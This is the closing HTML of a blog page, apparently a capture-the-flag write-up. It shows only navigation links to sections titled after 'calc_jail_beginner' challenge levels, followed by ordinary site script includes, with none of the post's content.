href="#tyPe-Ch-nnEl"><span class="nav-text">tyPe Ch@nnEl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4"><span class="nav-text">calc_jail_beginner_level4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-0-5"><span class="nav-text">calc_jail_beginner_level4.0.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-1"><span class="nav-text">calc_jail_beginner_level4.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-2"><span class="nav-text">calc_jail_beginner_level4.2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-3"><span class="nav-text">calc_jail_beginner_level4.3</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->

    
<script src="/js/lazyload.js"></script>



<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
